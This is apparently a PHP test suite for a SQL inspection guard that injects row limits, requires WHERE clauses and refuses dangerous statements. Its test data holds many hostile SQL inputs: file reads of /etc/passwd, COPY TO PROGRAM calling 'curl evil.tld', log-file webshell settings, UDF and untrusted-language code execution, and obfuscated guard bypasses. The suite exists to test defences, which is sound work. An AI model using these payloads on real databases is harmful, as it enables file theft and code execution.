<?php

use App\Enums\DbDriver;
use App\Enums\StatementType;
use App\Services\Sql\InspectionResult;
use App\Services\Sql\SqlInspector;
use PhpMyAdmin\SqlParser\Token;
use PhpMyAdmin\SqlParser\TokenType;

function inspect(string $sql, ?DbDriver $driver = null): InspectionResult
{
    return app(SqlInspector::class)->inspect($sql, $driver);
}

test('select without limit gets the default limit injected', function () {
    $result = inspect('SELECT * FROM users');

    expect($result->passes())->toBeTrue()
        ->and($result->statements[0]->preparedSql)->toBe("SELECT * FROM users\nLIMIT 1000")
        ->and($result->statements[0]->limitInjected)->toBeTrue()
        ->and($result->type())->toBe(StatementType::Read);
});

test('select with a reasonable limit is untouched', function () {
    $result = inspect('SELECT * FROM users LIMIT 50');

    expect($result->statements[0]->preparedSql)->toBe('SELECT * FROM users LIMIT 50')
        ->and($result->statements[0]->limitInjected)->toBeFalse()
        ->and($result->statements[0]->limitClamped)->toBeFalse();
});

test('select limit above the hard cap is clamped', function () {
    $result = inspect('SELECT * FROM users LIMIT 20000');

    expect($result->statements[0]->preparedSql)->toBe('SELECT * FROM users LIMIT 10000')
        ->and($result->statements[0]->limitClamped)->toBeTrue();
});

test('mysql offset-comma limit clamps the count only', function () {
    $result = inspect('SELECT * FROM users LIMIT 10, 20000');

    expect($result->statements[0]->preparedSql)->toBe('SELECT * FROM users LIMIT 10, 10000');
});

test('limit-offset form clamps the count only', function () {
    $result = inspect('SELECT * FROM users LIMIT 99999 OFFSET 4');

    expect($result->statements[0]->preparedSql)->toBe('SELECT * FROM users LIMIT 10000 OFFSET 4');
});

test('subquery limits are ignored when guarding the outer query', function () {
    $result = inspect('SELECT * FROM (SELECT id FROM t LIMIT 5) q');

    expect($result->statements[0]->preparedSql)->toBe("SELECT * FROM (SELECT id FROM t LIMIT 5) q\nLIMIT 1000");
});

test('limit is injected before a locking clause', function () {
    $result = inspect('SELECT * FROM jobs FOR UPDATE');

    expect($result->statements[0]->preparedSql)->toBe("SELECT * FROM jobs\nLIMIT 1000\nFOR UPDATE");
});

test('limit all is clamped to the hard cap', function () {
    $result = inspect('SELECT * FROM users LIMIT ALL');

    expect($result->statements[0]->preparedSql)->toBe('SELECT * FROM users LIMIT 10000');
});

test('update without where is rejected', function () {
    $result = inspect('UPDATE users SET active = 0');

    expect($result->passes())->toBeFalse()
        ->and($result->violations[0])->toContain('WHERE');
});

test('delete without where is rejected', function () {
    $result = inspect('DELETE FROM users');

    expect($result->passes())->toBeFalse()
        ->and($result->violations[0])->toContain('WHERE');
});

test('update with where passes and is classified as write', function () {
    $result = inspect('UPDATE users SET active = 0 WHERE id = 5');

    expect($result->passes())->toBeTrue()
        ->and($result->type())->toBe(StatementType::Write)
        ->and($result->statements[0]->preparedSql)->toBe('UPDATE users SET active = 0 WHERE id = 5');
});

test('multiple statements without a transaction are rejected', function () {
    $result = inspect('UPDATE a SET x=1 WHERE id=1; UPDATE b SET y=2 WHERE id=2');

    expect($result->passes())->toBeFalse()
        ->and(implode(' ', $result->violations))->toContain('explicit transaction');
});

test('an explicit transaction with multiple writes passes', function () {
    $result = inspect("BEGIN;\nUPDATE a SET x=1 WHERE id=1;\nINSERT INTO logs(msg) VALUES ('x');\nCOMMIT;");

    expect($result->passes())->toBeTrue()
        ->and($result->isTransaction)->toBeTrue()
        ->and($result->statements)->toHaveCount(2)
        ->and($result->type())->toBe(StatementType::Write);
});

test('where guard applies inside transactions', function () {
    $result = inspect('BEGIN; DELETE FROM users; COMMIT;');

    expect($result->passes())->toBeFalse()
        ->and(implode(' ', $result->violations))->toContain('WHERE');
});

test('begin without commit is rejected', function () {
    $result = inspect('BEGIN; UPDATE a SET x=1 WHERE id=1;');

    expect($result->passes())->toBeFalse()
        ->and(implode(' ', $result->violations))->toContain('COMMIT');
});

test('rollback statements are rejected', function () {
    $result = inspect('BEGIN; UPDATE a SET x=1 WHERE id=1; ROLLBACK;');

    expect($result->passes())->toBeFalse()
        ->and(implode(' ', $result->violations))->toContain('ROLLBACK');
});

test('forbidden administrative statements are rejected', function (string $sql) {
    expect(inspect($sql)->passes())->toBeFalse();
})->with([
    'DROP DATABASE prod',
    'GRANT ALL ON *.* TO joe',
    'REVOKE SELECT ON db.t FROM joe',
    'DENY SELECT ON t TO joe',
    'CREATE USER hacker IDENTIFIED BY "x"',
    'SET GLOBAL general_log = 1',
]);

test('show and explain are classified as reads without limit injection', function () {
    expect(inspect('SHOW TABLES')->type())->toBe(StatementType::Read)
        ->and(inspect('SHOW TABLES')->statements[0]->preparedSql)->toBe('SHOW TABLES')
        ->and(inspect('EXPLAIN SELECT * FROM t')->type())->toBe(StatementType::Read);
});

test('a cte wrapping a write is classified as write', function () {
    $result = inspect('WITH doomed AS (SELECT id FROM t) DELETE FROM t WHERE id IN (SELECT id FROM doomed)');

    expect($result->type())->toBe(StatementType::Write);
});

test('a pure cte select is read and gets a limit', function () {
    $result = inspect('WITH recent AS (SELECT * FROM t) SELECT * FROM recent');

    expect($result->type())->toBe(StatementType::Read)
        ->and($result->statements[0]->preparedSql)->toEndWith('LIMIT 1000');
});

test('unparseable dialect-specific selects still get guarded best-effort', function () {
    $result = inspect("SELECT id::text FROM users WHERE meta @> '{}'");

    expect($result->type())->toBe(StatementType::Read)
        ->and($result->statements[0]->preparedSql)->toEndWith('LIMIT 1000');
});

test('unparseable update without where is still rejected', function () {
    $result = inspect('UPDATE users SET meta = meta || \'{"a":1}\'::jsonb');

    expect($result->passes())->toBeFalse();
});

test('empty and comment-only input is rejected', function () {
    expect(inspect('')->passes())->toBeFalse()
        ->and(inspect('-- just a comment')->passes())->toBeFalse()
        ->and(inspect('/* block */')->passes())->toBeFalse();
});

test('insert is a write and passes without where', function () {
    $result = inspect('INSERT INTO t (a) VALUES (1)');

    expect($result->passes())->toBeTrue()
        ->and($result->type())->toBe(StatementType::Write);
});

test('semicolons inside string literals do not split statements', function () {
    $result = inspect("SELECT * FROM t WHERE name = 'a;b'");

    expect($result->passes())->toBeTrue()
        ->and($result->statements)->toHaveCount(1);
});

test('trailing semicolon does not create a phantom statement', function () {
    $result = inspect('SELECT * FROM t;');

    expect($result->statements)->toHaveCount(1)
        ->and($result->passes())->toBeTrue();
});

// --- Regression: guard bypasses found in the 2026-09-07 security scan ---

test('forbidden statements cannot be smuggled past the guard with comments', function (string $sql) {
    expect(inspect($sql)->passes())->toBeFalse();
})->with([
    'leading block comment' => '/* hi */ DROP DATABASE prod',
    'inline comment between keywords' => 'DROP/**/DATABASE prod',
    'leading line comment' => "-- x\nGRANT ALL ON *.* TO 'x'@'%'",
    'inline comment in SET GLOBAL' => 'SET/**/GLOBAL general_log = 1',
]);

test('file-IO statements are always rejected', function (string $sql) {
    expect(inspect($sql)->passes())->toBeFalse();
})->with([
    'SELECT INTO OUTFILE' => "SELECT * FROM users INTO OUTFILE '/tmp/x'",
    'SELECT INTO DUMPFILE' => "SELECT * FROM users INTO DUMPFILE '/tmp/x'",
    'LOAD DATA INFILE' => "LOAD DATA INFILE '/etc/passwd' INTO TABLE t",
    'COPY TO program' => "COPY t TO PROGRAM 'curl evil.tld'",
    'LOAD_FILE call' => "SELECT LOAD_FILE('/etc/passwd')",
]);

test('a data-modifying CTE is classified as a write, not a read', function () {
    $result = inspect('WITH x AS (INSERT INTO t VALUES (1) RETURNING id) SELECT * FROM x');

    expect($result->type())->toBe(StatementType::Write);
});

test('a trailing line comment cannot swallow the injected limit', function (string $sql, ?DbDriver $driver) {
    $prepared = inspect($sql, $driver)->statements[0]->preparedSql;

    // The injected LIMIT must sit on its own line, outside the comment.
    expect($prepared)->toContain("\nLIMIT 1000")
        ->and($prepared)->toEndWith('LIMIT 1000');
})->with([
    'dash comment' => ['SELECT * FROM users --', null],
    // "#" is a comment only in MySQL; an unknown driver refuses it.
    'hash comment' => ['SELECT * FROM users #', DbDriver::Mysql],
]);

test('an arithmetic or otherwise unparseable LIMIT is rejected, not left unclamped', function () {
    $result = inspect('SELECT * FROM users LIMIT 100*100000');

    expect($result->passes())->toBeFalse();
});

test('FETCH FIRST n ROWS ONLY above the hard cap is clamped', function () {
    $result = inspect('SELECT * FROM users ORDER BY id FETCH FIRST 9999999 ROWS ONLY');

    expect($result->passes())->toBeTrue()
        ->and($result->statements[0]->preparedSql)->toContain('FETCH FIRST 10000 ROWS ONLY')
        ->and($result->statements[0]->limitClamped)->toBeTrue();
});

// --- Regression: denylist gaps found in the 2026-09-18 security scan ---

test('privilege-escalation and code-execution statements are rejected', function (string $sql) {
    expect(inspect($sql)->passes())->toBeFalse();
})->with([
    'SET @@GLOBAL variable syntax' => "SET @@GLOBAL.general_log_file = '/var/www/s.php'",
    'SET @@global lowercase' => 'SET @@global.general_log = 1',
    'SET @@GLOBAL with loose spacing' => 'SET @@ GLOBAL . general_log = 1',
    'SET @@GLOBAL behind a comment' => 'SET/**/@@GLOBAL.general_log = 1',
    'SET PERSIST' => 'SET PERSIST general_log = 1',
    'SET @@PERSIST variable syntax' => 'SET @@PERSIST.general_log = 1',
    'MySQL UDF via SONAME' => "CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so'",
    'MySQL aggregate UDF via SONAME' => "CREATE AGGREGATE FUNCTION agg RETURNS INT SONAME 'udf.so'",
    'CREATE EXTENSION' => 'CREATE EXTENSION plpythonu',
    'CREATE EXTENSION IF NOT EXISTS' => 'CREATE EXTENSION IF NOT EXISTS plperlu',
    'PostgreSQL anonymous code block' => 'DO LANGUAGE plpythonu $$ import os; os.system("id") $$',
]);

test('postgresql file-IO functions are rejected even inside a read', function (string $sql) {
    expect(inspect($sql)->passes())->toBeFalse();
})->with([
    'pg_read_file' => "SELECT pg_read_file('/etc/passwd')",
    'schema-qualified pg_read_file' => "SELECT pg_catalog.pg_read_file('/etc/passwd')",
    'pg_read_binary_file' => "SELECT pg_read_binary_file('/etc/passwd')",
    'pg_ls_dir' => "SELECT pg_ls_dir('/')",
    'lo_import' => "SELECT lo_import('/etc/passwd')",
    'lo_export' => "SELECT lo_export(1, '/tmp/x')",
]);

test('legitimate statements are not caught by the widened denylist', function (string $sql) {
    expect(inspect($sql)->passes())->toBeTrue();
})->with([
    'UPDATE ... SET' => 'UPDATE t SET x = 1 WHERE id = 1',
    'SET NAMES' => 'SET NAMES utf8mb4',
    'SET SESSION' => "SET SESSION time_zone = '+00:00'",
    'SET @@SESSION variable syntax' => "SET @@SESSION.time_zone = '+00:00'",
    'user variable' => 'SET @x = 1',
    'file-IO name inside a string literal' => "SELECT * FROM logs WHERE action = 'pg_read_file'",
    'file-IO name as a column' => 'SELECT pg_read_file AS x FROM t',
    'file-IO name as a table prefix' => 'SELECT * FROM pg_ls_dir_audit',
    'SQL-bodied CREATE FUNCTION' => 'CREATE FUNCTION f() RETURNS int RETURN 1',
]);

test('DROP TABLE and TRUNCATE pass as approval-gated writes flagged as DDL', function (string $sql) {
    $result = inspect($sql);

    expect($result->passes())->toBeTrue()
        ->and($result->type())->toBe(StatementType::Write)
        ->and($result->hasDdl())->toBeTrue();
})->with([
    'DROP TABLE old_logs',
    'TRUNCATE TABLE sessions',
]);

// --- Targeted rules: judge the dangerous part, not the syntax (2026-09-18) ---

test('legitimate DBA statements the blanket denylist used to block now pass', function (string $sql) {
    expect(inspect($sql)->passes())->toBeTrue();
})->with([
    'CREATE EXTENSION' => 'CREATE EXTENSION pg_stat_statements',
    'CREATE EXTENSION IF NOT EXISTS' => 'CREATE EXTENSION IF NOT EXISTS pgcrypto',
    'quoted extension name' => 'CREATE EXTENSION "uuid-ossp"',
    'extension WITH SCHEMA and CASCADE' => 'CREATE EXTENSION IF NOT EXISTS postgis WITH SCHEMA public CASCADE',
    'DO block with the implicit plpgsql default' => 'DO $$ BEGIN UPDATE t SET x=1 WHERE id=2; END $$',
    'DO block with a leading LANGUAGE clause' => 'DO LANGUAGE plpgsql $$ BEGIN PERFORM 1; END $$',
    'DO block with a trailing LANGUAGE clause' => 'DO $$ BEGIN PERFORM 1; END $$ LANGUAGE plpgsql',
    'SET GLOBAL' => 'SET GLOBAL max_connections = 500',
    'SET @@GLOBAL variable syntax' => 'SET @@GLOBAL.wait_timeout = 600',
    'SET PERSIST' => 'SET PERSIST max_connections = 500',
    'SET GLOBAL with several harmless variables' => 'SET GLOBAL max_connections = 500, wait_timeout = 600',
    'SET GLOBAL TRANSACTION' => 'SET GLOBAL TRANSACTION ISOLATION LEVEL SERIALIZABLE',
]);

test('untrusted procedural languages are rejected however they are spelled', function (string $sql) {
    expect(inspect($sql)->passes())->toBeFalse();
})->with([
    'CREATE EXTENSION plpythonu' => 'CREATE EXTENSION plpythonu',
    'CREATE EXTENSION IF NOT EXISTS plperlu' => 'CREATE EXTENSION IF NOT EXISTS plperlu',
    'double-quoted extension name' => 'CREATE EXTENSION "plpythonu"',
    'backtick-quoted extension name' => 'CREATE EXTENSION `pltclu`',
    'single-quoted extension name' => "CREATE EXTENSION 'plperlu'",
    'lowercase keywords, uppercase name' => 'create extension PLPYTHON3U',
    'comments wedged into IF NOT EXISTS' => 'CREATE EXTENSION IF/**/NOT/**/EXISTS plpythonu',
    'untrusted extension WITH SCHEMA' => 'CREATE EXTENSION plsh WITH SCHEMA public',
    'DO with a leading LANGUAGE clause' => 'DO LANGUAGE plpythonu $$ import os $$',
    'DO with a trailing LANGUAGE clause' => 'DO $$ import os $$ LANGUAGE plpythonu',
    'DO with a quoted language name' => 'DO $$ import os $$ LANGUAGE "plperlu"',
    'DO with a custom dollar tag' => 'DO $py$ import os $py$ LANGUAGE plpython3u',
    'DO with a single-quoted body' => "DO 'import os' LANGUAGE plpythonu",
]);

test('persistent writes to file / code / protection variables are rejected', function (string $sql) {
    expect(inspect($sql)->passes())->toBeFalse();
})->with([
    'general_log_file' => "SET @@GLOBAL.general_log_file = '/var/www/x.php'",
    'general_log' => 'SET GLOBAL general_log = 1',
    'secure_file_priv' => "SET PERSIST secure_file_priv = ''",
    'local_infile' => 'SET GLOBAL local_infile = 1',
    'plugin_load_add' => "SET GLOBAL plugin_load_add = 'x'",
    'init_connect' => "SET GLOBAL init_connect = 'x'",
    'slow_query_log_file' => "SET GLOBAL slow_query_log_file = '/tmp/x'",
    'log_error' => "SET PERSIST log_error = '/tmp/x'",
    'backtick-quoted variable name' => 'SET GLOBAL `general_log` = 1',
    'double-quoted variable name' => 'SET GLOBAL "general_log" = 1',
    'the := assignment form' => 'SET GLOBAL general_log:=1',
    'the := assignment form after a space' => 'SET GLOBAL general_log := 1',
    'PERSIST_ONLY scope' => 'SET PERSIST_ONLY general_log = 1',
    'hidden behind a harmless first assignment' => 'SET GLOBAL max_connections = 500, general_log = 1',
]);

test('a violation names the extension and the reason it was refused', function () {
    $result = inspect('CREATE EXTENSION plpythonu');

    expect($result->passes())->toBeFalse()
        ->and($result->violations[0])->toContain('plpythonu')
        ->and($result->violations[0])->toContain('untrusted procedural language');
});

test('a dollar-quoted body is one statement, not one per semicolon inside it', function () {
    $result = inspect("DO \$fix\$\nBEGIN\n  UPDATE t SET x = 1 WHERE id = 2;\n  UPDATE u SET y = 2 WHERE id = 3;\nEND\n\$fix\$");

    expect($result->passes())->toBeTrue()
        ->and($result->statements)->toHaveCount(1)
        ->and($result->type())->toBe(StatementType::Write);
});

test('dollar quoting cannot hide a following statement from the guard', function (string $sql) {
    expect(inspect($sql)->passes())->toBeFalse();
})->with([
    'unterminated tag' => 'SELECT 1 $$; DROP DATABASE prod',
    'tag inside a string literal' => "SELECT '\$\$'; DROP DATABASE prod",
    'tag inside a line comment' => "-- \$\$\nDROP DATABASE prod",
    'mismatched open and close tags' => 'DO $a$ x $b$; DROP DATABASE prod',
    'statement appended after a real body' => 'DO $$ BEGIN PERFORM 1; END $$; DROP DATABASE prod',
]);

test('the guard lists are extended by configuration and cannot be shortened by it', function () {
    config([
        'queryproxy.untrusted_languages' => ['plevil'],
        'queryproxy.dangerous_variables' => ['evil_var'],
    ]);

    expect(inspect('CREATE EXTENSION plevil')->passes())->toBeFalse()
        ->and(inspect('DO $$ x $$ LANGUAGE plevil')->passes())->toBeFalse()
        ->and(inspect('SET GLOBAL evil_var = 1')->passes())->toBeFalse()
        // The built-in floor survives a configuration that no longer names it.
        ->and(inspect('CREATE EXTENSION plpythonu')->passes())->toBeFalse()
        ->and(inspect('SET GLOBAL general_log = 1')->passes())->toBeFalse();
});

test('the unconditional denylist cannot be carried through a DO block body', function (string $sql) {
    expect(inspect($sql)->passes())->toBeFalse();
})->with([
    'DROP DATABASE' => 'DO $$ BEGIN DROP DATABASE prod; END $$',
    'DROP SCHEMA' => 'DO $$ BEGIN DROP SCHEMA public CASCADE; END $$',
    'GRANT' => 'DO $$ BEGIN GRANT ALL ON *.* TO x; END $$',
    'REVOKE' => 'DO $$ BEGIN REVOKE SELECT ON t FROM x; END $$',
    'CREATE USER' => 'DO $$ BEGIN CREATE USER hacker; END $$',
    'pg_read_file' => "DO \$\$ BEGIN PERFORM pg_read_file('/etc/passwd'); END \$\$",
    'lo_export' => "DO \$\$ BEGIN PERFORM lo_export(1, '/tmp/x'); END \$\$",
    'COPY TO PROGRAM' => "DO \$\$ BEGIN COPY t TO PROGRAM 'curl evil.tld'; END \$\$",
    'behind an IF ... THEN' => 'DO $$ BEGIN IF x = 1 THEN DROP DATABASE prod; END IF; END $$',
    'quoted with a nested dollar tag' => 'DO $$ BEGIN EXECUTE $q$GRANT ALL ON *.* TO x$q$; END $$',
    'single-quoted body' => "DO 'BEGIN DROP DATABASE prod; END' LANGUAGE plpgsql",
]);

test('the DO body scan does not reject an ordinary plpgsql block', function (string $sql) {
    expect(inspect($sql)->passes())->toBeTrue();
})->with([
    'plain update' => 'DO $$ BEGIN UPDATE t SET x=1 WHERE id=2; END $$',
    'plain perform' => 'DO $$ BEGIN PERFORM 1; END $$',
    'a declared name that merely starts with a keyword' => 'DO $$ DECLARE copy_count int; BEGIN SELECT count(*) INTO copy_count FROM t; END $$',
    'a table name that merely starts with a keyword' => 'DO $$ BEGIN INSERT INTO outfile_log (a) VALUES (1); END $$',
    'a forbidden statement as literal data, not as code' => "DO \$\$ BEGIN UPDATE audit SET note = 'DROP DATABASE prod' WHERE id = 1; END \$\$",
]);

test('the DO body is read with PostgreSQL string rules, not the lexer\'s', function (string $sql) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->passes())->toBeFalse()
        ->and(implode("\n", $result->violations))->toContain('Inside the DO block body: Server-side file IO functions');
})->with([
    // standard_conforming_strings: 'a\' is a whole string, the call is code.
    'backslash before the closing quote' => "DO \$\$ BEGIN PERFORM 'a\\', pg_read_file('/etc/passwd') --'; END \$\$",
    'backslash before the closing quote, comment ended by a newline' => "DO \$\$ BEGIN PERFORM 'a\\', pg_read_file('/etc/passwd') --'\n; END \$\$",
    'backslash before the closing quote, named tag' => "DO \$body\$ BEGIN PERFORM 'a\\', pg_read_file('/etc/passwd') --'; END \$body\$",
    'escaped quote in an E string' => "DO \$\$ BEGIN PERFORM E'a\\'', pg_read_file('/etc/passwd') --'; END \$\$",
    'statement quoted for EXECUTE with a nested tag' => "DO \$\$ BEGIN EXECUTE \$q\$SELECT 'a\\', pg_read_file('/etc/passwd') --'\$q\$; END \$\$",
    '"#" is XOR in PL/pgSQL, not a comment' => "DO \$\$ BEGIN PERFORM 1 # 1, pg_read_file('/etc/passwd'); END \$\$",
    'quoted function name' => "DO \$\$ BEGIN PERFORM \"pg_read_file\"('/etc/passwd'); END \$\$",
    'E-string body' => "DO E'BEGIN PERFORM ''a\\\\'', pg_read_file(''/etc/passwd'') --''; END'",
]);

test('the DO body is the literal PostgreSQL runs, not merely the first one', function (string $sql, string $message) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->passes())->toBeFalse()
        ->and(implode("\n", $result->violations))->toContain($message);
})->with([
    // Literals separated by whitespace holding a newline are one string to PostgreSQL.
    'string continuation' => ["DO 'BEGIN PERFORM pg_read_' \n 'file(''/etc/passwd''); END'", 'more than one string literal'],
    'string continuation of an E string' => ["DO E'BEGIN PERFORM pg_read_' \n 'file(''/etc/passwd''); END'", 'more than one string literal'],
    // LANGUAGE takes a string as well, before or after the body.
    'language as a leading string' => ["DO LANGUAGE 'plpgsql' 'BEGIN PERFORM pg_read_file(''/etc/passwd''); END'", 'names its language with a string literal'],
    'language as a trailing dollar-quoted string' => ["DO 'BEGIN PERFORM pg_read_file(''/etc/passwd''); END' LANGUAGE \$\$plpgsql\$\$", 'names its language with a string literal'],
    'language as a leading dollar-quoted string' => ["DO LANGUAGE \$\$plpgsql\$\$ 'BEGIN PERFORM pg_read_file(''/etc/passwd''); END'", 'names its language with a string literal'],
    'language as a string behind a comment' => ["DO LANGUAGE /* x */ 'plpgsql' \$\$ BEGIN PERFORM 1; END \$\$", 'names its language with a string literal'],
]);

test('a U& quoted identifier in a DO body is decoded before the scan', function (string $sql) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->passes())->toBeFalse()
        ->and(implode("\n", $result->violations))->toContain('Inside the DO block body: Server-side file IO functions');
})->with([
    'default escape' => "DO \$\$ BEGIN PERFORM U&\"\\0070g_read_file\"('/etc/passwd'); END \$\$",
    'lowercase prefix, long escape' => "DO \$\$ BEGIN PERFORM u&\"\\+000070g_read_file\"('/etc/passwd'); END \$\$",
    'inside a nested tag' => "DO \$\$ BEGIN EXECUTE \$q\$SELECT U&\"\\0070g_read_file\"('/etc/passwd')\$q\$; END \$\$",
]);

test('a UESCAPE clause in a DO body is refused, whatever string names the escape', function (string $sql) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->passes())->toBeFalse()
        ->and(implode("\n", $result->violations))->toContain('Inside the DO block body: a UESCAPE clause is not allowed');
})->with([
    'plain string' => "DO \$\$ BEGIN PERFORM U&\"!0070g_read_file\" UESCAPE '!' ('/etc/passwd'); END \$\$",
    'behind a comment' => "DO \$\$ BEGIN PERFORM U&\"!0070g_read_file\" /* x */ UESCAPE\n'!'('/etc/passwd'); END \$\$",
    'E string' => "DO \$\$ BEGIN PERFORM U&\"!0070g_read_file\" UESCAPE E'!'('/etc/passwd'); END \$\$",
    'dollar-quoted string' => "DO \$\$ BEGIN PERFORM U&\"!0070g_read_file\" UESCAPE \$e\$!\$e\$('/etc/passwd'); END \$\$",
    'string continuation' => "DO \$\$ BEGIN PERFORM U&\"!0070g_read_file\" UESCAPE ''\n'!'('/etc/passwd'); END \$\$",
    'E string inside a nested tag' => "DO \$\$ BEGIN EXECUTE \$q\$SELECT U&\"!0070g_read_file\" UESCAPE E'!'('/etc/passwd')\$q\$; END \$\$",
    'U& string' => "DO \$\$ BEGIN PERFORM U&'!0041' UESCAPE '!'; END \$\$",
]);

test('nested dollar-quoted strings joined for EXECUTE cannot hide a statement written out in the body', function (string $sql, string $message) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->passes())->toBeFalse()
        ->and(implode("\n", $result->violations))->toContain($message);
})->with([
    // EXECUTE runs "SELECT '', pg_read_file('/etc/passwd') --'".
    'call after a quote opened in the previous region' => ["DO \$\$ BEGIN EXECUTE \$a\$SELECT '\$a\$ || \$b\$', pg_read_file('/etc/passwd') --'\$b\$; END \$\$", 'Inside the DO block body: Server-side file IO functions'],
    'statement after a quote opened in the previous region' => ["DO \$\$ BEGIN EXECUTE \$a\$SELECT '\$a\$ || \$b\$'; DROP DATABASE prod; --'\$b\$; END \$\$", 'Inside the DO block body'],
]);

test('dynamic SQL in a DO body is refused, however EXECUTE is spelled', function (string $sql) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->passes())->toBeFalse()
        ->and(implode("\n", $result->violations))->toContain('Inside the DO block body: dynamic SQL (EXECUTE) is not allowed');
})->with([
    'quoted statement' => ["DO \$\$ BEGIN EXECUTE 'SELECT pg_read_file(''/etc/passwd'')'; END \$\$"],
    'quoted DROP DATABASE' => ["DO \$\$ BEGIN EXECUTE 'DROP DATABASE prod'; END \$\$"],
    'E string' => ["DO \$\$ BEGIN EXECUTE E'SELECT pg_read_file(\\'/etc/passwd\\')'; END \$\$"],
    'quoted DO body' => ["DO 'BEGIN EXECUTE ''SELECT pg_read_file(''''/etc/passwd'''')''; END'"],
    'joined quoted and dollar-quoted text' => ["DO \$\$ BEGIN EXECUTE 'SELECT ''' || \$b\$', pg_read_file('/etc/passwd') --'\$b\$; END \$\$"],
    'format()' => ["DO \$\$ BEGIN EXECUTE format(\$q\$UPDATE %I SET note = 'x' WHERE id = 1\$q\$, 'items'); END \$\$"],
    'USING' => ["DO \$\$ DECLARE v int := 1; BEGIN EXECUTE \$q\$UPDATE items SET note = 'x' WHERE id = \$1\$q\$ USING v; END \$\$"],
    'lower case' => ["DO \$\$ BEGIN execute 'SELECT 1'; END \$\$"],
    'mixed case after a comment' => ["DO \$\$ BEGIN /* x */ ExEcUtE/**/'SELECT 1'; END \$\$"],
    'across a line break' => ["DO \$\$ BEGIN\nEXECUTE\n'SELECT 1'; END \$\$"],
    'line comment before it' => ["DO \$\$ BEGIN -- note\nEXECUTE 'SELECT 1'; END \$\$"],
    'quoted identifier' => ["DO \$\$ BEGIN \"execute\" 'SELECT 1'; END \$\$"],
    'U& identifier' => ["DO \$\$ BEGIN U&\"\\0065xecute\" 'SELECT 1'; END \$\$"],
    'OPEN FOR EXECUTE' => ["DO \$\$ DECLARE c refcursor; BEGIN OPEN c FOR EXECUTE 'SELECT 1'; END \$\$"],
    'function body created in the block' => ["DO \$\$ BEGIN CREATE FUNCTION f() RETURNS void LANGUAGE plpgsql AS \$f\$ BEGIN EXECUTE 'SELECT 1'; END \$f\$; END \$\$"],
]);

test('a DO body without EXECUTE may build text, quote data and create triggers', function (string $sql) {
    expect(inspect($sql, DbDriver::Pgsql)->passes())->toBeTrue();
})->with([
    'RAISE with || after quoted nested data' => ["DO \$\$ BEGIN RAISE NOTICE \$m\$it's\$m\$; RAISE NOTICE '%', 'a' || 'b'; END \$\$"],
    'format() without EXECUTE' => ["DO \$\$ BEGIN RAISE NOTICE '%', format(\$q\$UPDATE %I SET note = 'x' WHERE id = 1\$q\$, 'items'); END \$\$"],
    'RAISE with || and a quoted identifier in nested data' => ["DO \$\$ DECLARE v int := 1; BEGIN RAISE NOTICE \$q\$\"Items\" \$1\$q\$; RAISE NOTICE '%', 'done ' || v; END \$\$"],
    'the word in quoted data' => ["DO \$\$ BEGIN RAISE NOTICE 'execute later'; END \$\$"],
    'a longer identifier' => ["DO \$\$ DECLARE executed int := 1; BEGIN RAISE NOTICE '%', executed; END \$\$"],
    'trigger EXECUTE FUNCTION' => ['DO $$ BEGIN CREATE TRIGGER trg AFTER INSERT ON t FOR EACH ROW EXECUTE FUNCTION audit_row(); END $$'],
    'trigger EXECUTE PROCEDURE' => ['DO $$ BEGIN CREATE TRIGGER trg AFTER INSERT ON t FOR EACH ROW EXECUTE PROCEDURE public.audit_row(); END $$'],
]);

test('functions that run SQL given as text are refused, however they are named', function (string $sql, string $name) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->passes())->toBeFalse()
        ->and(implode("\n", $result->violations))->toContain("{$name}() is not allowed through QueryProxy");
})->with([
    'query_to_xml' => ["SELECT query_to_xml('SELECT pg_read_file(''/etc/passwd'')', true, false, '')", 'query_to_xml'],
    'query_to_xmlschema' => ["SELECT query_to_xmlschema('SELECT 1', true, false, '')", 'query_to_xmlschema'],
    'query_to_xml_and_xmlschema' => ["SELECT query_to_xml_and_xmlschema('SELECT 1', true, false, '')", 'query_to_xml_and_xmlschema'],
    'ts_stat' => ["SELECT * FROM ts_stat('SELECT 1')", 'ts_stat'],
    'schema-qualified' => ["SELECT pg_catalog.query_to_xml('SELECT 1', true, false, '')", 'query_to_xml'],
    'double-quoted' => ["SELECT \"query_to_xml\"('SELECT 1', true, false, '')", 'query_to_xml'],
    'schema-qualified and double-quoted' => ["SELECT pg_catalog.\"ts_stat\"('SELECT 1')", 'ts_stat'],
    'upper case' => ["SELECT QUERY_TO_XML('SELECT 1', true, false, '')", 'query_to_xml'],
    'ts_rewrite' => ["SELECT ts_rewrite('a'::tsquery, 'SELECT t, s FROM aliases')", 'ts_rewrite'],
    'crosstab' => ["SELECT * FROM crosstab('SELECT row_name, cat, value FROM t') AS ct(row_name text, a int)", 'crosstab'],
    'crosstab3' => ["SELECT * FROM public.crosstab3('SELECT row_name, cat, value FROM t')", 'crosstab3'],
    'crosstab with a category query' => ["SELECT * FROM crosstab('SELECT 1', 'SELECT pg_terminate_backend(1)') AS ct(a int)", 'crosstab'],
    'connectby' => ["SELECT * FROM connectby('t', 'id', 'parent_id', '1', 0) AS c(id int, parent_id int, level int)", 'connectby'],
    'xpath_table' => ["SELECT * FROM xpath_table('id', 'doc', 't', '/a', 'true') AS x(id int, a text)", 'xpath_table'],
    'ts_rewrite in a DO body' => ["DO \$\$ BEGIN PERFORM ts_rewrite('a'::tsquery, 'SELECT 1'); END \$\$", 'ts_rewrite'],
]);

test('a setting carried by a function, procedure, database or role is held to the SET rule', function (string $sql) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->passes())->toBeFalse()
        ->and(implode("\n", $result->violations))->toContain('SET session_replication_role is not allowed');
})->with([
    'CREATE FUNCTION ... SET before the body' => ['CREATE FUNCTION f() RETURNS void LANGUAGE sql SET session_replication_role = replica AS $$ DELETE FROM items WHERE id = 1 $$'],
    'CREATE OR REPLACE PROCEDURE ... SET ... TO' => ['CREATE OR REPLACE PROCEDURE p() LANGUAGE plpgsql SET session_replication_role TO replica AS $$ BEGIN NULL; END $$'],
    'CREATE FUNCTION ... SET after the body' => ['CREATE FUNCTION f() RETURNS int LANGUAGE sql AS $$ SELECT 1 $$ SET session_replication_role FROM CURRENT'],
